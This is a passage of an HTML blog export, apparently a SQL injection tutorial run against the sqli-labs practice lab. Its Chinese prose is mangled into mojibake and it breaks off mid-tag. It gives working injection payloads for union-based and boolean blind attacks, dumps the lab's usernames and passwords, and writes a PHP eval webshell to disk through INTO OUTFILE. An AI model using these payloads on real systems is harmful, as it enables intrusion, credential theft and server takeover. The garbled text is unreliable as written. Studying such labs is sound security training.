æ³¨å…¥ POST è¯·æ±‚å‚æ•°æ˜¯æ”¾åœ¨è¯·æ±‚ body é‡Œçš„ï¼Œé•¿åº¦æ²¡æœ‰é™åˆ¶</p>\n<p>COOKIE æ³¨å…¥ cookie å‚æ•°æ”¾åœ¨è¯·æ±‚å¤´ä¿¡æ¯ï¼Œæäº¤çš„æ—¶å€™ æœåŠ¡å™¨ä¼šä»è¯·æ±‚å¤´è·å–</p>\n<h4 id=\"æ³¨å…¥æ•°æ®ç±»å‹çš„åŒºåˆ†\"><a class=\"markdownIt-Anchor\" href=\"#æ³¨å…¥æ•°æ®ç±»å‹çš„åŒºåˆ†\">#</a> <span class=\"kbd\">æ³¨å…¥æ•°æ®ç±»å‹çš„åŒºåˆ†</span></h4>\n<p>int æ•´å‹ select * from users where id=1 sting</p>\n<p>å­—ç¬¦å‹ select * from users where username=â€˜adminâ€™ like</p>\n<p>æœç´¢å‹ select * from news where title like â€˜% æ ‡é¢˜ %â€™</p>\n<h3 id=\"union-select-è”åˆæ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#union-select-è”åˆæ³¨å…¥\">#</a> <span class=\"kbd\">union select è”åˆæ³¨å…¥</span></h3>\n<p>1, åˆ¤æ–­ [<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0=\">http://www.sql.cn/Less-1/?id=</span>](<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0tNA==\">http://www.sql.cn/Less-1/?id=-4</span>â€™ union select 1,2,3 %23)1â€™ and 1=1 %23</p>\n<p>[<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0=\">http://www.sql.cn/Less-1/?id=</span>](<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0tNA==\">http://www.sql.cn/Less-1/?id=-4</span>â€™ union select 1,2,3 %23)1â€™ and 1=2 %23</p>\n<p>æŠ¥é”™å­˜åœ¨æ³¨å…¥</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero6.png\" alt=\"\"></p>\n<p>2, æŸ¥å­—æ®µ</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' order by 1 %23  --è¿”å›æ­£å¸¸</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?id=1'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> <span class=\"token number\">2</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span>  <span class=\"token comment\">-- è¿”å›æ­£å¸¸</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' order by 3 %23  --è¿”å›æ­£å¸¸</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>?id=1'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> <span class=\"token number\">4</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span>  <span class=\"token comment\">-- è¿”å›é”™è¯¯</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>ä¸‰ä¸ªå­—æ®µ</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero7.png\" alt=\"\"></p>\n<p>åˆ©ç”¨ union è”åˆæŸ¥è¯¢æ”¶é›†ä¿¡æ¯</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,2,3 %23</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>#çœ‹å“ªä¸ªå­—æ®µå¯ä»¥æ˜¾ç¤ºä¿¡æ¯ï¼Œåˆ©ç”¨å®ƒè·å–æ•°æ®åº“ä¿¡æ¯</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>è·å–æ•°æ®åº“ä¿¡æ¯</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>?id=-1'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>concat_ws<span class=\"token punctuation\">(</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>@<span class=\"token variable\">@datadir</span><span class=\"token punctuation\">,</span>@<span class=\"token variable\">@version_compile_os</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>databaes<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#è·å–æ•°æ®åº“ç”¨æˆ·å</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#è·å–æ•°æ®åº“ç‰ˆæœ¬</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>@<span class=\"token variable\">@datadir</span> <span class=\"token comment\">#è·å–æ•°æ®åº“è·¯å¾„</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>@<span class=\"token variable\">@version_conpile_os</span> <span class=\"token comment\">#è·å–æ“ä½œç³»ç»Ÿç‰ˆæœ¬</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Your Login name:</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>' <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>security <span class=\"token comment\">#æ•°æ®åº“å</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>ï¼ˆ<span class=\"token number\">5.7</span><span class=\"token number\">.26</span>ï¼‰ <span class=\"token comment\">#æ•°æ®åº“ç‰ˆæœ¬</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>ï¼ˆroot<span class=\"token variable\">@localhost</span>ï¼‰ <span class=\"token comment\">#æ•°æ®åº“ç”¨æˆ·å</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>ï¼ˆD:\\Everyday<span class=\"token operator\">-</span>tools\\phpstudy_pro\\Extensions\\MySQL5<span class=\"token punctuation\">.</span><span class=\"token number\">7.26</span>\\<span class=\"token keyword\">data</span>\\root<span class=\"token variable\">@localhost</span>ï¼‰<span class=\"token comment\">#æ•°æ®åº“è·¯å¾„</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>Win64 <span class=\"token comment\">#æ“ä½œç³»ç»Ÿç‰ˆæœ¬</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Your Password:<span class=\"token number\">3</span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero8.png\" alt=\"\"></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,2,table_name from information_schema.tables where table_schema='</span>security<span class=\"token string\">' limit 0,1 %23</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>#æŸ¥è¯¢å•ä¸ª æ”¹å˜limit 0,1 å‰é¢çš„æ•°å³å¯æŸ¥è¯¢å…¶ä»–è¡¨ä¾‹å¦‚ limit 1,1 limit 2,1</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>å¦ä¸€ç§æŸ¥è¯¢å…¨éƒ¨</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>?id=-1'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>group_concat <span class=\"token comment\">#åˆ†ç»„æŸ¥è¯¢ç»“æœï¼Œéš”å¼€</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>emails<span class=\"token punctuation\">,</span>referers<span class=\"token punctuation\">,</span>uagents<span class=\"token punctuation\">,</span>users</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero9.png\" alt=\"\"></p>\n<p>4, æŸ¥åˆ—å</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,2,group_concat(column_name ) from information_schema.columns where table_schema=database() and table_name = \"users\" %23</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Your Login name:2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Your Password:id,username,password #åˆ—å</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>?id=-1'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span>password <span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> users <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#æŸ¥è¯¢ users è¡¨é‡Œçš„ username å’Œ password</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Your Login name:<span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Your Password:DumbDumb<span class=\"token punctuation\">,</span>AngelinaI<span class=\"token operator\">-</span><span class=\"token keyword\">kill</span><span class=\"token operator\">-</span>you<span class=\"token punctuation\">,</span>Dummyp<span class=\"token variable\">@ssword</span><span class=\"token punctuation\">,</span>securecrappy<span class=\"token punctuation\">,</span>stupidstupidity<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>supermangenious<span class=\"token punctuation\">,</span>batmanmob<span class=\"token operator\">!</span>le<span class=\"token punctuation\">,</span>adminadmin<span class=\"token punctuation\">,</span>admin1admin1<span class=\"token punctuation\">,</span>admin2admin2<span class=\"token punctuation\">,</span>admin3admin3<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>dhakkandumbo<span class=\"token punctuation\">,</span>admin4admin4</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero10.png\" alt=\"\"></p>\n<h3 id=\"å†™webshell\"><a class=\"markdownIt-Anchor\" href=\"#å†™webshell\">#</a> <span class=\"kbd\">å†™ webshell</span></h3>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ä¸‰ä¸ªæ¡ä»¶ï¼š</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">1.</span>å…·æœ‰rootæƒé™ã€‚</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">2.</span>åœ¨æ•°æ®åº“é…ç½®æ–‡ä»¶ä¸­çš„ é…ç½®é¡¹å«æœ‰ï¼šsecure_file_priv<span class=\"token operator\">=</span><span class=\"token string\">''</span>ã€‚</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>ï¼ˆæ³¨æ„åœ¨æ•°æ®åº“ä¸­æ­¤é¡¹é»˜è®¤ä¸ºsecure_file_priv<span class=\"token operator\">=</span><span class=\"token boolean\">null</span>ï¼‰ã€‚</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>secure_file_prive<span class=\"token operator\">=</span><span class=\"token boolean\">null</span> <span class=\"token comment\">// é™åˆ¶ mysqld ä¸å…è®¸å¯¼å…¥å¯¼å‡º</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>secure_file_priv<span class=\"token operator\">=</span><span class=\"token operator\">/</span>path<span class=\"token operator\">/</span>  <span class=\"token comment\">// é™åˆ¶ mysqld çš„å¯¼å…¥å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨é»˜è®¤çš„ /path/ ç›®å½•ä¸‹</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>secure_file_priv<span class=\"token operator\">=</span>â€™â€™  <span class=\"token comment\">// ä¸å¯¹ mysqld çš„å¯¼å…¥ å¯¼å‡ºåšé™åˆ¶</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">3.</span>çŸ¥é“æ•°æ®åº“çš„ç»å¯¹è·¯å¾„ã€‚</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">outfile</span>å‡½æ•°å¯ä»¥å¯¼å‡ºå¤šè¡Œï¼Œè€Œ<span class=\"token keyword\">dumpfile</span>åªèƒ½å¯¼å‡ºä¸€è¡Œæ•°æ®</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">outfile</span>å‡½æ•°åœ¨å°†æ•°æ®å†™åˆ°æ–‡ä»¶é‡Œæ—¶æœ‰ç‰¹æ®Šçš„æ ¼å¼è½¬æ¢ï¼Œè€Œ<span class=\"token keyword\">dumpfile</span>åˆ™ä¿æŒåŸæ•°æ®æ ¼å¼</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,\"&lt;?php @eval($_POST['</span>cmd'<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>?<span class=\"token operator\">></span><span class=\"token string\">\",3 into outfile \"</span>D:\\\\Everyday<span class=\"token operator\">-</span>tools\\\\phpstudy_pro\\\\WWW\\\\www<span class=\"token punctuation\">.</span><span class=\"token keyword\">sql</span><span class=\"token punctuation\">.</span>cn\\\\shell8<span class=\"token punctuation\">.</span>php\" <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr></table></figure><h3 id=\"booleanæ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#booleanæ³¨å…¥\">#</a> <span class=\"kbd\">Boolean æ³¨å…¥</span></h3>\n<p>å¸ƒå°”å‹ç›²æ³¨ï¼Œé¡µé¢ä¸è¿”å›æŸ¥è¯¢ä¿¡æ¯çš„æ•°æ®ï¼Œåªèƒ½é€šè¿‡é¡µé¢è¿”å›ä¿¡æ¯çš„çœŸå‡æ¡ä»¶åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥.</p>\n<p>1, æŠ¥é”™</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>åˆ¤æ–­æ•´æ•°è¿˜æ˜¯å­—ç¬¦å‹</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>åˆ¤æ–­æœ‰æ²¡æœ‰æ³¨å…¥</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>?id=1'</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> æŠ¥é”™</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>åˆ¤æ–­å­—æ®µæ•°</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' order by 1 %23</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>?id=1'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> <span class=\"token number\">2</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' order by 3 %23</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>?id=1'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> <span class=\"token number\">4</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> æŠ¥é”™</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>å­—æ®µä¸‰ä¸ª</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>çˆ†æ•°æ®åº“é•¿åº¦</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>lengthï¼ˆï¼‰è¿”å›å­—ç¬¦ä¸²é•¿åº¦</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>å¦‚æœæ•°æ®åº“é•¿åº¦å¤§äºç­‰äºè¡¨è¾¾å¼åé¢çš„æ•°å°±è¿”å›æ­£å¸¸ æŠ¥é”™å‰é¢çš„é‚£ä¸ªæ•°å°±æ˜¯æ•°æ®åº“é•¿åº¦</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and length(database())>=4 %23 æ­£å¸¸</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> length<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>=</span><span class=\"token number\">6</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> æ­£å¸¸</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and length(database())>=7 %23 æ­£å¸¸</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> length<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>=</span><span class=\"token number\">8</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> æ­£å¸¸</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and length(database())>=9 %23 æŠ¥é”™</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>æ•°æ®åº“é•¿åº¦9</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>çˆ†æ•°æ®åº“å</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>æ•°æ®åº“åçš„èŒƒå›´ä¸€èˆ¬åœ¨a~zã€0~9ä¹‹å†…ï¼Œå¯èƒ½è¿˜ä¼šæœ‰ç‰¹æ®Šå­—ç¬¦ \"_\"ã€\"-\" ç­‰ï¼Œè¿™é‡Œçš„å­—æ¯ä¸åŒºåˆ†å¤§å°å†™ã€‚</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>å®šä¹‰å’Œç”¨æ³•</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>SUBSTR() å‡½æ•°ä»å­—ç¬¦ä¸²ä¸­æå–å­å­—ç¬¦ä¸²ï¼ˆä»ä»»æ„ä½ç½®å¼€å§‹ï¼‰ã€‚</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"a\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> æŠ¥é”™</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr(database(),1,1)=\"b\" %23 æŠ¥é”™</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"c\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> æŠ¥é”™</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr(database(),1,1)=\"s\" %23 æ­£å¸¸</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºs</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"a\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> æŠ¥é”™</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr(database(),2,1)=\"b\" %23 æŠ¥é”™</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"c\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> æŠ¥é”™</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr(database(),2,1)=\"d\" %23 æŠ¥é”™</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"e\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> æ­£å¸¸</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>ç¬¬äºŒä¸ªå­—ç¬¦ä¸ºeæ›¿æ¢<span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span>ä½ç½®çš„<span class=\"token number\">2</span>ä¸º<span class=\"token number\">3</span>å°±å¯ä»¥çˆ†ç ´ç¬¬ä¸‰ä¸ªå­—ç¬¦ä»¥æ­¤ç±»æ¨çˆ†å‡ºæ•°æ®åº“åsecurity</pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>ASCIIç æŸ¥è¯¢</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>a çš„ASCIIç æ˜¯<span class=\"token number\">97</span>ï¼Œåœ¨MySQLä¸­ä½¿ç”¨ordå‡½æ•°è½¬æ¢ASCIIï¼Œæ‰€ä»¥é€å­—ç¬¦åˆ¤æ–­è¯­å¥å¯æ”¹ä¸ºï¼š</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>ord<span class=\"token punctuation\">(</span>substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token number\">97</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>ASCIIç è¡¨ä¸­å¯æ˜¾ç¤ºå­—ç¬¦çš„èŒƒå›´æ˜¯ï¼š<span class=\"token number\">0</span><span class=\"token operator\">~</span><span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>çˆ†è¡¨å</pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">-- ä¿®æ”¹ 1,1 å‰è¾¹çš„ 1~20ï¼Œé€å­—ç¬¦çŒœè§£å‡ºç¬¬ä¸€ä¸ªè¡¨çš„å</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">-- ä¿®æ”¹ limit çš„ 0,1 å‰è¾¹çš„ 0~20ï¼Œé€ä¸ªçŒœè§£æ¯ä¸ªè¡¨</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>æŸ¥è¯¢ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1 ),1,1)=\"b\" %23</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>æŠ¥é”™</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">\"security\"</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"c\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>æŠ¥é”™</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1 ),1,1)=\"e\" %23</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>æ­£å¸¸</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>ç¬¬ä¸€ä¸ªè¡¨åemails,æ¥ç€æŸ¥ç¬¬äºŒä¸ª</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">\"security\"</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span 